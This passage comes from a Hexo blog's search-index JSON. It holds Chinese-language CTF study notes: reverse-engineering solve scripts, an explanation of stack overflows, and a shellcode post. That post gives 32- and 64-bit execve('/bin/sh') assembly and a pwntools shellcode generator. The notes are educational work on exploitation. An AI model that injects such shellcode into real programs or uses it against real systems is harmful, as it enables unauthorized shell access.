flag[::-1])\n\nhelloworld直接APKIDE打开找到MainActivity.smali翻到flag\nreverse3一道很简单的题目，关键是看出来v4是base64加密(受益于认真听s0uthwood师傅讲课让我一眼看了出来)，特征是一大堆移位异或，以及长为64的数组，还有和base64一样的table。\n最后根据逻辑直接反向写出脚本\nfrom base64 import b64decode\nres = 'e3nifIH9b_C@n@dH'\ndest = ''\nfor i in range(len(res)):\n\tdest += chr(ord(res[i]) - i)\nprint(dest)\nv4 = b64decode(dest.encode())\nprint(v4)\n\n不一样的flag一道迷宫题，迷宫是长为25的字符串，将其转换为5*5的二维平面走通即可\n*1111\n01000\n01010\n00010\n1111#\n\nSimpleRev本题的关键是搞懂大小端存储（一般都是小端），然后就是爆破了，因为使用了取模，所以是难以直接倒推的，因此采用爆破可见字符即可\n# coding=utf-8\ntable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'ADSFKNDCLS'\ntext = 'killshadow'\nkey_res = ''\nfor i in range(len(key)):\n\tif ord(key[i % len(key)]) > 64 and ord(key[i % len(key)]) &lt;= 90:\n\t\tkey_res += chr(ord(key[i % len(key)]) + 32)\n\telse:\n\t\tkey_res += key[i]\n# print(key_res)\nflag = ''\nfor i in range(len(key)):\n\tfor j in table:\n\t\tif text[i] == chr((ord(j) - 39 - ord(key_res[i % len(key)]) + 97) % 26 + 97):\n\t\t\tflag += j\nprint(flag)\n\n","slug":"CTF/reverse/RE-BUU","date":"2022-01-18T07:17:52.000Z","categories_index":"CTF/REVERSE","tags_index":"CTF REVERSE","author_index":"S1eepy"},{"id":"33178a053863ba406bb965eb7a776aab","title":"shellcode","content":"\n\nshellcode什么是shellcode软件漏洞利用过程中使用一小段机器代码\n启动shell进行交互\n可能存在的问题shellcode只允许输入十几个字节\n无法调用系统函数(不知道system的地址)\n解决触发中断（0x80或者syscall）\n如何编写shellcode32位;;nasm -f elf32 i386.asm\n;;ld -m elf_i386 -o i386 i386.o\n;;objdump -d i386\nglobal _start\n_start:\n\tpush &quot;&#x2F;sh&quot;\n\tpush &quot;&#x2F;bin&quot;\n\tmov ebx, esp;;ebx&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;\n\txor edx, edx;;edx&#x3D;0\n\txor ecx, ecx;;ecx&#x3D;0\n\tmov al, 0xb;;设置al&#x3D;0xb\n\tint 0x80\n\n64位;;name -f elf64 x64.asm\n;;ld -m elf_x86 -o x64 x64.o\n;;objdump -d x64\nglobal _start\n_start:\n\tmov rbx, &#39;&#x2F;bin&#x2F;sh&#39;\n\tpush rbx\n\tpush rsp\n\tpop rdi\n\txor esi, esi\n\txor edx, edx\n\tpush 0x3b\n\tpop rax\n\tsyscall\n\npwntools快速生成shellcodefrom pwn import *\ncontext(log_level='debug',arch='i386',os='linux')\nshellcode=asm(shellcraft.sh())\n\n例题mrctf2020_shellcodeciscn_2019_s_9pwnable_orwshellcode的变形mrctf_shellcode_revengealpha3编码github.com/TaQini/alpha3.git\n","slug":"CTF/pwn/shellcode","date":"2022-01-18T04:55:28.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"b0e5183f9443ee80e444d03488f07c6f","title":"栈溢出基础","content":"\n\n栈溢出基础C语言函数调用栈栈是程序运行时一块连续的内存区域，用来保存函数运行时的状态信息，包括函数的局部变量等\n当发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶\n函数调用结束时栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态\n函数调用栈的内存中从高地址到低地址生长，所以栈顶内存地址在压栈时变小，退栈时变大\n寄存器\neip寄存器：下一条要被执行的指令，它所指向的指令\nesp寄存器：保存调用栈的栈顶地址\nebp寄存器：保存当前函数状态基地址\n\n函数调用过程先把参数压入栈\n然后将调用函数(caller)的下一条指令的地址作为被调用函数(callee)的返回地址压入栈中\n再将ebp的值压入栈，并将ebp寄存器的值更新为当前栈顶的地址，这样caller的ebp信息得以保存，同时ebp被更新为callee的基地址\n最后是将callee的局部变量等数据压入栈（栈溢出最经常出现的位置）\n\n函数调用结束恢复过程变化的核心任务是丢弃callee的状态，将栈顶恢复到caller的过程\n首先将局部变量从栈顶弹出，栈顶会恢复到callee的基地址\n然后caller的基地址从栈顶弹出，存到ebp内，这样caller的ebp信息得以恢复，此时栈顶指向返回地址\n再将返回地址从栈内弹出，存到eip寄存器内，这样caller的eip信息得以恢复\n栈溢出原理从上面可以看出，caller的eip完全是由返回地址控制的，只要想办法在写入局部变量时控制长度，写入到返回地址处，就能够让caller的eip调到其他地方，从而getshell\n\n\n\n\n\n\n\n\n\n缓冲区溢出：本质是向定长的缓冲区写入了超长的数据，从而导致数据覆盖了合法内存，包括栈溢出，堆溢出，data段溢出等\n栈溢出基本利用","slug":"CTF/pwn/栈溢出基础","date":"2022-01-18T04:54:11.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"a100591a1cf0e28185d19ee6ce40ac1f","title":"Learn_RE","content":"\n\nRE学习笔记记录一下寒假期间学习RE的知识\n","slug":"CTF/reverse/Learn_RE","date":"2022-01-18T04:52:25.000Z","categories_index":"CTF/REVERSE","tags_index":"CTF REVERSE","author_index":"S1eepy"},{"id":"0c0a9c1a2db47172b0f7b7bd30e860a1","title":"Learn_PWN","content":"PWN学习笔记记录一下放大三寒假期间学习PWN的知识\n","slug":"CTF/pwn/Learn_PWN","date":"2022-01-18T04:51:06.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"298a963bd623954dbff89574513140ea","title":"Learn_WEB","content":"\n\nWEB学习笔记由于之前的web笔记被火绒当病毒杀了，当时没救回来，于是乎就懒得再写一遍了，之后跟着更新就行应该\n","slug":"CTF/web/Learn_WEB","date":"2022-01-18T03:20:26.000Z","categories_index":"CTF/WEB","tags_index":"CTF WEB","author_index":"S1eepy"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-01-18T01:13:55.638Z","categories_index":"","tags_index":"","author_index":"S1eepy"}]